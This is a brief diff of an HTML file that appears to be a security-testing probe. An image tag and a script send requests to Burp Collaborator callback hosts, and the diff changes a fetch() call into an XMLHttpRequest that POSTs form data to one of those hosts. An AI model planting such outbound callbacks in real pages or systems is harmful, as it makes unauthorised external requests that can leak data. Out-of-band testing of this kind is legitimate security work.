@@ -5,7 +5,12 @@
   <body>
     <img src="https://wuuegxm7ykxc8yrdwdfhn9yez55vtk.burpcollaborator.net/ash-img">
     <script>
-      fetch("https://7rzlkg9b01svfk322ly0e8ileck28r.burpcollaborator.net/ash-fetch")
+      var formData = new FormData();
+      formData.append("name", "Murdock");
+      var req = new XMLHttpRequest();
+      req.open("POST", "7rzlkg9b01svfk322ly0e8ileck28r.burpcollaborator.net/ash-xmlhttp");
+      req.send(formData);
+      //fetch("https://7rzlkg9b01svfk322ly0e8ileck28r.burpcollaborator.net/ash-fetch")
     </script>
   </body>
   </html>
